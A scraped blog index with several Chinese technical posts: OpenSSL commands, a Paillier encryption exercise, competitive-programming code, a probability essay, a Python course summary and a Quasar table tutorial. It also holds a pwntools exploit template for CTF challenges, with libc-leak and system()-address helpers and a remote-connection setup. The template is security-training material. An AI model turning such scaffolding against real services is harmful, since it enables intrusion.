连接远程服务器的443(HTTPS)端口并使用TLS协议的SNI扩展访问指定主机openssl s_client -connect www.massivehost.com:443 -servername www.myhost.com# 开启SSL服务器，默认监听4433端口，单html页面openssl s_server -cert mycert.pem -www# 开启SSL服务器，监听443端口，拥有类似反代服务器的web目录（即当前目录）openssl s_server -cert mycert.pem -accept 443 -WWW# 远程服务器443端口连接测速，用新session访问test.html，且只使用SSLv3以及高强度加密算法，测试指标为10秒内连接次数openssl s_time -connect remote.host:443 -www /test.html -new -ssl3 -time 10 -cipher HIGH 素数12345678# 素性判定openssl prime 561# 16进制数素性判定openssl prime -hex 2f# 产生指定长度的素数openssl prime -generate -bits 64# 产生指定长度的16进制素数openssl prime -generate -bits 64 -hex 其它123456# 翻译SSL错误信息，最后的参数是错误码openssl errstr 0407006A# 产生1024字节随机数据，并base64编码openssl rand -base64 -out random-data 1024# RSA算法测速openssl speed rsa","link":"/post/OpenSSLCheatsheet/"},{"title":"Paillier同态加密方案实现","text":"最后一次抽代课的上机练习。 方案介绍详见wiki。 练习内容我忘记了……凭借代码想起来一点： 生成 10bit 的大素数p,q，输出公钥与私钥。 令明文m1 = 15, m2 = 20，输出加密后的密文c1, c2。 对密文c1, c2解密，输出解密结果m1', m2'。 对c1 * c2解密，输出解密结果m'，以验证m' = m1' + m2'。 最后一步就是验证该方案是一种同态加密方案。 代码生成 10bit 大素数偷了个懒。剩余的过程主要参考了维基上的方法，依旧离不开熟悉的快速幂、扩展欧几里得、求逆元三大算法。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from Crypto.Util import numberimport mathimport random# constantsn_length = 10p = number.getPrime(n_length)q = number.getPrime(n_length)n = p*qn2 = n**2m1 = 15m2 = 20# general funcsdef L(x): global n return (x-1) // ndef lcm(a,b): return abs(a*b) // math.gcd(a,b)def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: #raise Exception('Modular inverse does not exist') return -1 else: return x % mdef quick_pow(a, b, p): ret = 1 a %= p while b: if b&amp;1: ret = (ret * a) % p b &gt;&gt;= 1 a = (a * a) % p return retrandom.seed()lamb = lcm(p-1, q-1)mu = -1while mu == -1: g = random.randint(0, n2-1) mu = modinv(L(quick_pow(g,lamb,n2)), n)print('PubKey: (n={},g={})'.format(n,g))print('PrivKey: (lambda={},p={},q={})'.format(lamb,p,q))print('mu: {}'.format(mu))r1 = random.randint(0,n-1)r2 = random.randint(0,n-1)c1 = quick_pow(g,m1,n2) * quick_pow(r1,n,n2) % n2c2 = quick_pow(g,m2,n2) * quick_pow(r2,n,n2) % n2print('c1: {}'.format(c1))print('c2: {}'.format(c2))m1_ = L(quick_pow(c1,lamb,n2)) * mu % nm2_ = L(quick_pow(c2,lamb,n2)) * mu % nprint(&quot;m1': {}&quot;.format(m1_))print(&quot;m2': {}&quot;.format(m2_))m_ = L(quick_pow(c1*c2,lamb,n2)) * mu % nprint(&quot;m': {}&quot;.format(m_))","link":"/post/Paillier/"},{"title":"计算多项式的系数","text":"掉进数论的一个大坑里了。 题目简介 给定一个多项式 $(ax+by)^k$，计算多项式展开后 $x^ny^m$ 项的系数。 Input 第 1 行：一个整数 T （1≤T≤100000）为问题数。 接下来共 T 行。每行 5 个整数，分别为 a，b，k，n，m，整数之间由一个空格分隔。 0≤k≤1,000,000，0≤n,m≤k，且 n+m=k，0≤a,b≤10^9。 Output 对于每个问题，输出一行问题的编号（0 开始编号，格式：case #0: 等）。 然后对应每个问题在一行中输出一个整数，表示所求的系数（这个系数可能很大，输出对 1000000007 取模后的值）。 说明由于 n,m 过大不能直接预处理组合数；又因为 p 过大 Lucas 定理的递归形式在这里也不能直接使用。后来才发现原来只要预处理阶乘+快速幂+逆元求组合数就可以了。。。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;bits/stdc++.h&gt;#define p 1000000007#define K 1000000typedef long long ll;ll a, b, k, n, m, fac[K+1];void init(){ fac[0] = 1; for(int i = 1; i &lt;= K; ++i) fac[i] = fac[i-1]*i % p;}ll pow_mod(ll a, ll x){ ll ret = 1; while (x) { if (x &amp; 1) ret = (ret * a) % p; a = (a * a) % p; x &gt;&gt;= 1; } return ret;}ll C(ll n, ll m){ if(m &gt; n) return 0; return fac[n] * pow_mod((fac[m]*fac[n-m])%p, p-2) % p;}int main(){ int cas; ll ans; scanf(&quot;%d&quot;, &amp;cas); init(); for (int t = 0; t &lt; cas; ++t) { scanf(&quot;%lld%lld%lld%lld%lld&quot;, &amp;a, &amp;b, &amp;k, &amp;n, &amp;m); ans = pow_mod(a, n); ans = (ans * pow_mod(b, m)) % p; ans = (ans * C(k, m)) % p; printf(&quot;case #%d:\\n%lld\\n&quot;, t, ans); } return 0;} 顺便扔个 Lucas 模板（非原创）备用，n，m 较大而 P 较小时可用： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include&lt;bits/stdc++.h&gt;#define P 10007using namespace std;typedef long long ll;ll pow_mod(ll a, ll x, int p){ ll ret = 1; while(x) { if (x &amp; 1) ret = ret * a % p; a = a * a % p; x &gt;&gt;= 1; } return ret;}ll comb(ll a, ll b, int p){ if (a &lt; b) return 0; if (a == b) return 1; if (b &gt; a - b) b = a - b; ll ans = 1, ca = 1, cb = 1; for (ll i = 0; i &lt; b; ++i) { ca = (ca * (a - i)) % p; cb = (cb * (b - i)) % p; } ans = (ca * pow_mod(cb, p-2, p)) % p; return ans;}ll lucas(ll n, ll m, int p){ ll ans = 1; while(n &amp;&amp; m &amp;&amp; ans) { ans = (ans * comb(n%p, m%p, p)) % p; n /= p; m /= p; } return ans;}int main(){ int cas, k; ll a, b, n, m; cin &gt;&gt; cas; for (int t = 0; t &lt; cas; ++t) { cin &gt;&gt; a &gt;&gt; b &gt;&gt; k &gt;&gt; n &gt;&gt; m; printf(&quot;case #%d:\\n&quot;, t); if (n + m != k) cout &lt;&lt; &quot;0&quot; &lt;&lt; endl; else { ll ans = pow_mod(a, n, P); ans = (ans * pow_mod(b, m, P)) % P; ans = (ans * lucas(k, n, P)) % P; cout &lt;&lt; ans &lt;&lt; endl; } } return 0;}","link":"/post/PolyCoefficient/"},{"title":"有趣的概率——概率论课程报告","text":"一道数竞压轴题的直观解法。 背景这篇报告的灵感来源于一道1992年普特南数学竞赛真题，原题的表述如下： A–6 Four points are chosen at random on the surface of a sphere. What is the probability that the center of the sphere lies inside the tetrahedron whose vertices are at the four points? (It is understood that each point is independently chosen relative to a uniform distribution on the sphere.) 题目大意：在球面上随机选择四个点构成四面体，求球心落在该四面体内（含边界）的概率。 初步思路减小规模对于这类空间几何问题，容易想到通过“降维处理”来降低思维难度。因此，我们不妨考虑如下问题： 在圆上任取三个点构成三角形，求圆心落在该三角形内（含边界）的概率。 这里我们再次降低问题的规模：假设三个点分别为P1,P2,P3，固定P1,P2两点，再在圆上随机取一点P3。改变P3的位置，可以发现，当且仅当P3在一段特定的弧上时，圆心在三角形内，而这段弧的长度与圆的周长的比值即为二维情况下的的答案。 这里值得一提的是，上一段最后一句话看似是一个显然的结论，实际上却暗藏玄机。我们认为，P3能够取的所有点的集合——也就是这段特定的弧，的长度占圆周长的比例就是要求的概率，而这个命题成立的前提是：三角形的顶点在圆上是均匀分布的。这看起来同样很显然，不过这个等可能性假设会决定样本空间的大小，有时甚至能影响结果的正确性！ 这提醒我们，概率论并不像表面看上去那样，是在单纯直观地计算事件发生的概率——对样本空间的严谨定义常常被人忽视。实际上，在上世纪初法国数学家贝特郎已经提出了“贝特郎奇论”，用不同的等可能性假设计算出同一个问题的三个“正确答案”，推动了概率论向公理化的方向发展。 回到正题，显然弧长与P1,P2的选择有关。分别过P1,P2以及圆心作直线，那么这两条直线将把圆分成四段弧。P1,P2相对的那段弧的长度即为所求。为了求出这段弧的平均长度，我们考虑两种极限情况：（1）P1,P2重合，该弧长等于0；（2）P1,P2位于圆两端（即P1P2为圆的一条直径），该弧长等于圆的半周长。又因为P1,P2的选取是任意的，极限情况的均值，也就是1/4周长，就是这段弧长的平均值。我们得到，二维情况下的答案为1/4。 同样地，这里取（最大值+最小值）的均值也是因为，我们已经假定P1,P2在圆上均匀分布——因此弧长在0到半周长也是均匀分布的。于是我们求出弧的平均长度，实际上就是求出了圆心落在三角形内（含边界）的概率期望。 推广推广到三维，假设四个点分别为P1,P2,P3,P4，我们固定P1,P2,P3点，并且分别过P1,P2,P3以及球心作直线，这些直线两两决定一个平面。画出图像后可以看到，球面被平面分为了8个区域，而P4需要落在P1,P2,P3相对的那个区域里。 然而，有别于二维情况，让P1,P2,P3变化并设法求出那块区域的平均面积是十分困难的。也许可以借助曲面积分解决，但步骤将十分繁琐。因此，我们需要变换思路。 变换思路低维情况另解回到二维的情况，既然刚才的方法推广时遇到了困难，那么能不能换一种更容易推广的方法呢？这需要对问题作进一步的简化。 考虑刚才的解法中的核心元素：新增的两条辅助线。由于这两条辅助线简化了问题，我们尝试将问题只用这些新增的元素重新描述。在这里，我们不再考虑随机选取三个点，而是考虑：随机选择两条过圆心的直线，每条直线对应圆上的两个点。 于是，对于第一条直线，我们在它与圆的两个交点中选择一个，定为P1。类似地，对另一条重复操作得到P2。这种做法等价于在圆上随机选取两点，但是，正如我们后面将看到，却更容易推广到三维了。 此外，我们不妨交换原题中操作的顺序，即先随机选取P3，然后再决定P1与P2的位置。这样，当选择好两条直线后，P1和P2的位置只剩下了四种情况，每种情况都是等可能的。但是，容易证明有且仅有一种情况会使得P3落在P1,P2相对的圆弧上。因此，我们又一次得到了答案1/4。 可以看到，调整了随机选点的过程后，我们用一种截然不同的方式求得了答案。更重要的是，将这一过程推广到三维极其容易。 重新推广任取球面上一点P4，再任取三条过球心的直线。对每条直线，在它与球面的两个交点中选取一个作为Pi, i=1,2,3。我们得到2^3=8种等可能结果，其中有且仅有一种结果能使得P4落在P1,P2,P3相对的球面区域上。即，有且仅有一种结果使得球心落在该四面体内。显而易见，1/8就是这个问题的答案了。 结论与启示必须承认，上述解法是基于几何直观的，离开这种几何直观性，要如何证明我们得到的结果是正确的呢？换而言之，怎么把解答的过程用数学语言写下来？ 这个问题在数学中十分常见：理解问题并知道关键是一回事，但掌握相关背景知识，更正式、清晰地阐述这个理解，完全就是另一回事了。 但是从这个问题中获得的启示不应该是这个答案本身，而是找到关键想法的思维方式。即：不断寻找问题的简化版本，并在过程中关注那些新添加的结构（本题中是两条辅助线），尝试用新结构来重述整个问题。 此外，更值得强调的是解题过程中的严谨性。概率论在诞生之初，（也许是由于过分强调实用的原因）并不严谨，也没有一个稳固的公理体系。而如今，运用公理逐渐完备的概率论进行计算时，我们也必须注意避免犯下隐蔽的“假设性错误”，由于想当然的假设和自己补充的条件而得出错误的结论。和数学领域其它学科一样，是严谨性使得概率论来源于生活却又高于生活。 参考资料： http://kskedlaya.org/putnam-archive/1992.pdf http://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm http://kskedlaya.org/putnam-archive/2005.pdf http://kskedlaya.org/putnam-archive/2005s.pdf","link":"/post/ProbabilityReport/"},{"title":"Pwn 脚本模板","text":"其中从 # start 到 # end 中间的部分为核心代码。最近更新的博客中Pwn题脚本的代码仅包含核心代码。 依赖 必需 pwntools gdb Python 2 / 3 Ubuntu 16.x / 18.x / 19.x 非必需（可将对应功能注释掉） LibcSearcher one_gadget patchelf glibc-all-in-one 说明 leak_libc 函数可以选择使用指定 ELF 文件或是利用 LibcSearcher 搜寻libc 使用不同于系统版本的 libc 时，需要用到 patchelf 工具 增删改查功能的序号以及发送内容的逻辑，请根据具体题目修改 主要代码放在 # start 和 # end 之间 远程运行时必须指定 -p 选项 其它功能请运行 python exp.py -h 查询 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *from LibcSearcher import LibcSearcherfrom argparse import ArgumentParser, ArgumentDefaultsHelpFormatters = lambda data: p.send(str(data))sa = lambda delim,data: p.sendafter(delim,str(data))sl = lambda data: p.sendline(str(data))sla = lambda delim,data: p.sendlineafter(delim,str(data))r = lambda num=4096: p.recv(num)ru = lambda delims,drop=True: p.recvuntil(delims,drop)uu64 = lambda data: u64(data.ljust(8,'\\0'))leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))def leak_libc(func,addr,elf=None): if elf: libc = elf base = addr-libc.sym[func] leak('base',base) system = base+libc.sym['system'] else: libc = LibcSearcher(func,addr) base = addr-libc.dump(func) leak('base',base) system = base+libc.dump('system') return (base,libc,system)parser = ArgumentParser(formatter_class=ArgumentDefaultsHelpFormatter)parser.add_argument('-b',help='binary file',required=True,metavar='BINARY')parser.add_argument('-r',help='remote host',default='node3.buuoj.cn',metavar='RHOST')parser.add_argument('-p',type=int,help='remote port',metavar='RPORT')parser.add_argument('-l',help='libc - [xx] for v2.xx, or [/path/to/libc.so.6] to load a specific libc',default='23',metavar='LIBC')parser.add_argument('-d',help='disable DEBUG mode',action='store_true')args = parser.parse_args()print(args)binary = args.bcontext.binary = binaryelf = ELF(binary,checksec=False)if not args.d: context.log_level = 'DEBUG'path_dict = { '23': '/lib/x86_64-linux-gnu/libc.so.6', '27': './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so', '29': './glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so'}libc_path = path_dict.get(args.l, args.l)libc = ELF(libc_path,checksec=False)if args.p: p = remote(args.r, args.p)else: p = process(binary,env={'LD_PRELOAD':libc_path})def dbg(): gdb.attach(p) pause()_add,_free,_edit,_show = 1,4,2,3def add(index,content='a'*8): sla(':',_add) sla(':',index) sa(':',content)def free(index): sla(':',_free) sla(':',index)def edit(index,content): sla(':',_edit) sla(':',index) sa(':',content)def show(index): sla(':',_show) sla(':',index)# start# endp.interactive()","link":"/post/PwnTemplate/"},{"title":"《Python编程技术》期末作业","text":"期末作业居然是写综述。。有点无聊啊。这不是Python教程。 入门本学期学习了Python语言。由于之前已经学习过C, C++, Java（以及VB, Pascal, 前端三件套）等较难的编程语言，Python语言的学习没有太多挑战性。容易注意到，Python语言最大的特点是现成的可方便调用的库很丰富，语言本身对于一些底层操作的封装也做得很好，因此常常可以看到效果相同的程序，用Python编写比用C/C++（不用提Java）要短很多。 然而，代价是性能的大幅降低。好在常用Python实现的程序体量都不会太大，因此速度的问题并不突出。此外，Python语言作为解释型语言，一旦发布程序即开源。不过如今，这恐怕并不是什么缺点了。 首先我们学习了Python3的安装与配置。过程非常简单：从官网下载安装包，配好环境变量后在命令行验证即可。编写和运行Python程序也极其简单：课上的第一个例子便是输出Hello World语句。为此，老师提供了两种方法，一是Python交互模式下直接输入print(‘Hello World’)并回车；二是在一个形如1.py文件中输入上述语句，并在命令行中输入 python 1.py来执行。 一般来说，后一种方法使用较多。因此，我们需要称手的代码编辑器。老师推荐我们使用Sublime Text和Vscode。实际操作中，我发现对于体积稍大一点的程序（例如上百行），使用IDE是更为明智的选择。因此，对于短小的代码我是用Vscode来编辑，而较长的代码我选择了用PyCharm编辑。 在刚开始学习编程时，我曾使用记事本编辑代码——众所周知，记事本保存的文件会莫名其妙地在开头加上特殊字符，这曾使得作为初学者的我十分困惑。因此，使用记事本（甚至Word）写代码绝对是错误的选择。 接下来我们进入了正式的Python语法的学习。 基础特性与语法规则首先是带我们入门的老朋友print()函数。 1234print('11', '22') # 11 22print(1 + 2) # 3print('11', end = '')print('22', end = '') # 1122 可以接收用逗号隔开的字符串，这些字符串输出时中间会加上1个空格； 可以接收数学表达式； 可以用参数end指定其结尾字符，默认为换行符； 与输出对应的是输入函数input()。 12345name = input('Enter your name:')print('Hello,', name)# Enter your name:# &gt; Merc ury# Hello, Merc ury 整行读取，返回读取到的字符串； 可以拥有一个字符串作为参数，表示提示信息。 这两个函数十分简单。随后老师介绍了一些语法，与C/C++重复的语法规则将不再赘述： 12345678PI = 3.14 print(r'\\n\\n\\n') # (indent error)print(r'\\n\\n\\n') # \\n\\n\\nprint('''line1line2line3''') 注释以#开头； 强制要求代码块缩进； 数据类型有整数、浮点数、字符串、布尔、空等等； 字符串：既可以用单引号又可以用双引号括起来； 字符串：引号前加r表示raw，既取消转义； 字符串：'''…'''可以表示多行字符串； 字符串是不可变类型； 布尔：只有True/False两个值，逻辑运算and,or,not； 空值：None，并不是0； 变量使用前不需要声明，变量类型不固定（动态语言）； 没有机制保证常量不被修改； /是浮点除法、//是整除； **表示乘方； 整数、浮点数没有范围限制，浮点数超出一定范围会显示inf。 然后是一些常用函数： 1234567891011ord('A') # 65chr(66) # Bs = 'H e l l o'len(s) # 5s.encode('utf-8')lst = s.split(' ') # ['H', 'e', 'l', 'l', 'o']','.join(lst) # 'H,e,l,l,o'print('{name} does {thing}'.format(name='s.b.', thing='s.th.'))# s.b does s.th.print('%s does it %d times' % ('s.b.', 6))# s.b. does it 6 times ord()字符变整数编码，chr()整数编码变字符； bytes类型在引号前加b，str转bytes用encode()方法，如s.encode(‘utf-8’)，decode()反之。 len()接收一个序列（列表、元组、字符串等）参数，返回其长度； 格式化字符串：字符串内和C语言一样，后接 % (值0,值1,值2…)；或用‘{0}：{1:.2f}‘.format(‘abc’, 0.254)，输出为abc：0.25。大括号中的数字并不是必须的； 字符串.split(‘ ‘)用空格分割字符串形成列表；’,’.join(列表)用逗号连接列表形成字符串； 关于控制流： 123456789101112131415161718for i in range(5): print(i)else: print('Done')# 0# 1# 2# 3# 4# Donewhile True: print('Reached') breakelse: print('Not reached')print('Done')# Reached# Done 条件两边都不用括号，但右边要冒号，下面的语句块需要缩进； if-&gt;elif-&gt;else； while-&gt;else（else有必要吗？）； for-&gt;else； for i in range(a, b)，左闭右开，range第三个参数表示步长； break会跳过循环的else； 函数与模块： 1234567891011121314151617181920212223242526def func(a, b=5, c=10): print('a is', a, 'and b is', b, 'and c is', c)func(3, 7) # a is 3 and b is 7 and c is 10func(25, c=24) # a is 25 and b is 5 and c is 24func(c=50, a=100) # a is 100 and b is 5 and c is 50def add_end(L=[]): L.append('END') return Ladd_end([1, 2, 3]) # [1, 2, 3, 'END']add_end() # ['END']add_end() # ['END', 'END']def calc(*numbers): sum = 0 for n in numbers: sum = sum + n * n return sumcalc(1, 2, 3) # 14calc() # 0from math import sqrtsqrt(9) # 3 def定义函数； global声明全局变量； 默认参数必须指向不可变对象； 关键字参数：调用函数时，参数列表中用参数名=值的方式指定部分参数的值； 可变参数：*arg表示元组，**arg表示字典，可直接传参； 可以返回多个返回值，实际上是返回元组； 代码重用：import 库；from 库 import …； dir()返回当前模块的名称列表，或给定参数模块的名称列表； 独立运行模块时，__name__==’__main__’； 数据结构： 1234567891011121314151617181920212223242526lst = ['a', 'b', 'c']len(lst) # 3lst.append('d') # ['a', 'b', 'c', 'd']lst.insert(1, 'e') # ['a', 'e', 'b', 'c', 'd']lst.sort() # ['a', 'b', 'c', 'd', 'e']lst.pop(1) # ['a', 'b', 'c', 'd']lst[0] = 11 # [11, 'b', 'c', 'd']tup = (2) # 2tup = (2,) # (2,)d = {'a': 97, 'b': 98, 'c': 99}d['b'] == 98 # Trued['c'] = 100 # {'a': 97, 'b': 98, 'c': 100}'cc' in d # Falsed.get('bb', -1) # -1d.pop('c') # {'a': 97, 'b': 98}s = set([1, 1, 2, 2, 3, 3])s.add(4) # {1, 2, 3, 4}s1 = set([1, 2, 3])s1.remove(1) # {2, 3}s &amp; s1 # {2, 3}'abcdefg'[::2] # 'aceg''abcdefg'[1:-1] # 'bcdef' 列表：[ ]括起来，可变，可以索引，可以用len()取长度; 列表：append()追加元素（来自参数）； 列表：insert(i, s)在索引i处插入元素s； 列表：pop()删除末尾元素，或接收参数i删除索引为i的元素； 列表：元素类型可以互不相同； 元组：( )括起来，不可变，可以索引； 元组：只有一个元素1的元组：(1,)而不是(1)； 字典：{ }括起来，{key0: value0, key1: value1}形式，键值必须是不可变对象； 字典：字典变量[键]来得到对应的值，或用字典变量.get(键)得到，get()的第二个参数是没找到时的返回值，默认为None； 字典：删除键值对：字典变量.pop(键)； 集合：用一个列表初始化，无重复元素，add()添加元素，remove()删除元素； 集合：元素必须是不可变对象； 序列：如列表、元组、字符串，主要功能是in判断和切片； 切片：[-2]倒数第2个；[2:]第2个到最后；有冒号时左闭右开；第2个冒号后是步长。 随后的课程内容包括了一部分Python高级特性，包括迭代器、生成器、异常处理、面向对象编程、匿名函数等等。 高级特性与OOP首先，我们需要理解迭代的概念：所谓迭代，即用循环来遍历可迭代对象。判断对象是否可迭代： 123from collections import Iterableisinstance('123', Iterable) # Trueisinstance(123, Iterable) # False 迭代的一般形式是for 变量 in 可迭代对象:，例如： 12345678910d = {'a': 97, 'b': 98, 'c': 99}for key, val in d.items(): print(key + '=' + val)# b = 98# a = 97# c = 99 (unordered)# Or instead:[key + '=' + val for key, val in d.items()]# ['b=98', 'a=97', 'c=99'] 上面的第二种方法用到了列表生成式，它还可以这样用，来把列表中的字符串全部变成小写： 123L = ['RESTful', 'LaTeX', 'GitHub', 'iPhone'][s.lower() for s in L]# ['restful', 'latex', 'github', 'iphone'] 可以想到，在生成方法已知的情况下，直接求出整个列表常常是没有必要的。为了边循环边计算，Python提供了生成器对象： 1234567891011121314151617g = (s.lower() for s in L)next(g) # 'restful'next(g) # 'latex'# Generate Fibonacci sequence(less than 2000)def fib(): prev, curr = 0, 1 while True: yield curr prev, curr = curr, curr + prevf = fib()for i in f: if i &gt; 2000: break print(i) 生成器对象可以用next()来生成下一个元素，但由于它是可迭代的，我们通常习惯用循环来遍历其元素。此外，在上面的例子中，fib()并不是一个函数，而是一个生成器，因为其定义中带有yield关键字。 那么，为什么next()可以返回生成器生成的下一个元素呢？通过查阅文档发现，next()的参数需要是一个迭代器对象。因此我们知道，生成器是一种迭代器。 然而，isinstance([], Iterator)语句的结果却是False，意味着列表（字典、字符串）并不是迭代器对象，尽管可以用iter()进行强制转换。这揭示了迭代器对象作为流对象的最大优点，即惰性计算。 同时，迭代器迭代完毕后，我们注意到Python解释器会抛出StopIteration的错误。这是一个典型的异常，而接下来我们要做的就是处理这一异常。异常处理语法有点类似Java，这里我们用一个常规的文件处理（这里没有介绍，因为比较简单，而且和C++太相似了）的例子来说明： 123456789101112131415161718192021222324252627import sysimport timef = Nonetry: f = open(&quot;poem.txt&quot;) while True: line = f.readline() if len(line) == 0: break print(line, end='') sys.stdout.flush() print(&quot;Press ctrl+c now&quot;) time.sleep(2)except IOError: print(&quot;Could not find file poem.txt&quot;)except KeyboardInterrupt: print(&quot;!! You cancelled the reading from the file.&quot;)finally: if f: f.close() print(&quot;(Cleaning up: Closed the file)&quot;)# Or use instead:with open(&quot;poem.txt&quot;) as f: for line in f: print(line, end='') 这里将可能产生异常的代码块放在了try:后面，并在except:后捕获并处理异常，finally:进行善后工作。另一种方案是用with...as...语句来简化资源的获取与释放。 我们也可以自己定义一种异常，并在try:语句块中用raise 异常名抛出异常。这里就需要我们定义一种异常类，并产生一个异常对象。于是我们接下来学习了面向对象编程。 对于面向对象程序设计，经过C++与Java两门语言的学习，我再熟悉不过了，因此许多OOP中重要的概念，如封装、继承、多态等这里不会再赘述。 在任何类的对象方法的参数列表开头都会有一个self参数，引用对象本身，作用相当于this指针； 类的构造函数名称为__init__； 私有变量以__开头（但是不能以__结尾！），从外部访问这一变量只会新增一个同名变量；本质：Name-mangling 继承：class 派生类(基类):；继承元组中也可以有多个基类，即多重继承； 所有方法都是虚拟的（C++ virtual关键字）； type(对象)返回对象类型；isinstance()对于继承的类更方便；dir()获取一个对象的所有属性和方法； 可以定义类属性和类方法，后者需要装饰器（不在课程范围内）@classmethod 最后以一个简单的例子结束OOP部分： 123456789101112131415161718192021class Fib: def __init__(self): self.prev = 0 self.curr = 1 def __iter__(self): return self def __next__(self): val = self.curr self.curr += self.prev self.prev = val if self.prev &gt; 2000: raise StopIteration return valf = Fib()for i in f: print(i, end=' ') 最后一点额外的内容是匿名函数，简单来说就是lambda 参数: 表达式的形式，其中“参数”可选，“表达式”即返回值。另外，lambda表达式本身也可以作为函数的返回值。 图形化编程在课程最后我们学习了基于tkinter的图形化编程,为此我们需要import tkinter模块。从一个简单的例子开始： 1234567891011121314151617181920from tkinter import *def showPosEvent(event): print('Widget=%s X=%s Y=%s' % (event.widget, event.x, event.y))def onLeftClick(event): print('Got left mouse button click:', end=' ') showPosEvent(event)tkroot = Tk()labelfont = ('courier', 20, 'bold')widget = Label(tkroot, text='Hello bind world')widget.config(bg='red', font=labelfont)widget.config(height=5, width=20)widget.pack(expand=YES, fill=BOTH)widget.bind('&lt;Button-1&gt;', onLeftClick)widget.focus()tkroot.title('Click Me')tkroot.mainloop() 我们用Tk()创建主窗体，Label创建一个标签，通过其config方法设置各种属性后，用pack方法装入主窗体中。 为了让控件能响应事件，使用bind方法，第一个参数表示事件类型，可以有&lt;Button-1&gt;(鼠标左键), &lt;Button-2&gt;(鼠标中键), &lt;Button-3&gt;(鼠标右键), &lt;Double-1&gt;(左键双击), &lt;B1-Motion&gt;(左键拖动), &lt;Key-Press&gt;, &lt;Up&gt;, &lt;Return&gt;等等;第二个参数是检测到事件发生时的行为，用一个函数名表示（类似Java的EventListener）。该函数的参数是一个event对象，其属性widget表示事件作用的控件，x和y表示坐标（如果有的话）。 最后，这里用focus方法设置焦点，mainloop使窗体开始循环等待，也就是真正运行起来。运行效果： 这里用的控件是Label，对于其它控件同理，如Button,Frame,Entry, Checkbutton, Radiobutton, Scale等等。 除此之外，tkinter也提供了一些封装好的对话框供我们调用。例如： 1234567891011121314151617181920212223from tkinter.filedialog import askopenfilenamefrom tkinter.colorchooser import askcolorfrom tkinter.messagebox import askquestion, showerrorfrom tkinter.simpledialog import askfloatfrom tkinter import *demos = { 'Open': askopenfilename, 'Color': askcolor, 'Query': lambda: askquestion('Warning', 'You typed &quot;rm *&quot;\\nConfirm?'), 'Error': lambda: showerror('Error!', &quot;He's dead, Jim&quot;), 'Input': lambda: askfloat('Entry', 'Enter credit card number')}class Demo(Frame): def __init__(self, parent=None, **options): Frame.__init__(self, parent, **options) self.pack() Label(self, text=&quot;Basic demos&quot;).pack() for (key, value) in demos.items(): Button(self, text=key, command=value).pack(side=TOP, fill=BOTH)if __name__ == '__main__': Demo().mainloop() 点击Open按钮，会出现文件选择的对话框；Color则对应颜色选择对话框；Query对应消息提示框(带问号+是/否选项);Error出现错误提示框；Input则弹出带文本框的对话框，允许用户进行输入。 从这个例子我们也可以发现，tkinter和面向对象的结合同样十分便捷。运用这种面向对象的思想，我们实现一个按钮类，用于在退出时弹出确认对话框： 12345678910111213141516from tkinter import *from tkinter.messagebox import askokcancelclass Quitter(Frame): def __init__(self, parent=None): Frame.__init__(self, parent) self.pack() widget = Button(self, text='Quit', command=self.quit) widget.pack(side=LEFT, expand=YES, fill=BOTH) def quit(self): ans = askokcancel('Verify exit', &quot;Really quit?&quot;) if ans: quit()if __name__ == '__main__': Quitter().mainloop() 此外，除了用上面提到的pack方法可以管理控件布局外，我们还可以使用grid布局管理器。它将控件放置到一个二维的表格里，主控件被分割成一系列的行和列，表格中的每个单元(cell)都可以放置一个控件。例如： 1234567891011121314from tkinter import *master = Tk()Label(master, text=&quot;First&quot;).grid(row=0,column=0, sticky=W)Label(master, text=&quot;Second&quot;).grid(row=1,column=0, sticky=W)e1 = Entry(master)e2 = Entry(master)e1.grid(row=0, column=1,sticky=(E, S))e2.grid(row=1, column=1,sticky=(E, S))master.mainloop() 效果： 需要注意的是，pack布局管理器与grid布局管理器不应在一个窗口中混合使用。 如果我们想在窗体中显示图片也同样可行。这需要用到Canvas对象： 12345678picdir = &quot;pic.gif&quot;from tkinter import *win = Tk()img = PhotoImage(file=picdir)can = Canvas(win)can.pack(fill=BOTH)can.create_image(20, 20, image=img, anchor=NW)win.mainloop() 这是最简单的在窗体中显示一张图片的方法，同样我们可以给Button的img属性赋值来在按钮上显示图片。 所谓Canvas对象，即画布对象，其功能远不止于绘制一张已有的图片。它不仅拥有其它控件类似的属性与方法，还有自带的许多绘图方法，如create_line, create_oval, create_rectangle, create_arc, create_image, create_text, create_window等。根据其参数列表传入适当的参数，可以完成大部分基本的绘图功能。结合前面提到的鼠标拖动事件与面向对象编程，完全可以让用户自己在窗体内创作图像。 tkinter同样支持listbox控件，下拉菜单与窗体菜单，带滚动条的文本框等等,他们的方法多样，但也有许多相似之处。下面是两个简单的示例： 第一个是菜单栏的测试，第二个是一个简单的文本编辑器。 到这里，这门课程的内容差不多结束了。然而Python的功能远远不止这些，课程的结束也并不意味着Python学习的结束。在学习完课程之后，我又尝试写了基于Python的爬虫——根据豆瓣电影排行来自动推荐电影，并通过微信自动回复的接口实现交互。 项目地址：https://github.com/SignorMercurio/WechatFilmRecommender 参考资料： Python教程 - 廖雪峰的官方网站 简明Python教程 教学课件","link":"/post/PythonSummary/"},{"title":"QTable 服务端分页实践","text":"QTable 是 Quasar Framework 的组件之一，功能比较复杂。这篇文章介绍了如何配合服务端分页来使用 QTable 组件。 参考了Quasar 官方文档。 背景最近接的一个项目中有一个页面需要加载一个表格，表格的数据是通过异步调用从后端获取的。由于数据量较大，可能需要分页、排序等操作，我选择使用QTable组件，其核心属性包含： data：数组，按行存放表格数据，每个对象为一行 columns：数组，每个元素表示一列的属性，例如列名、该列的样式、是否能够排序等等 row-key：某一列的name属性，用来唯一标识一行 pagination.sync：一个对象，包含了分页器的一些属性 这里因为要处理分页问题，我着重关注的是pagination.sync属性，官方文档中的例子显示它长这样： 1234567pagination: { sortBy: 'name', descending: false, page: 2, rowsPerPage: 3 // rowsNumber: xx if getting data from a server} sortBy字段表示排序的关键字，descending表示是否是降序排序，page表示当前所在页，rowsPerPage表示当前选择的每页最大行数。用户操作分页器时，pagination也会相应地改变。 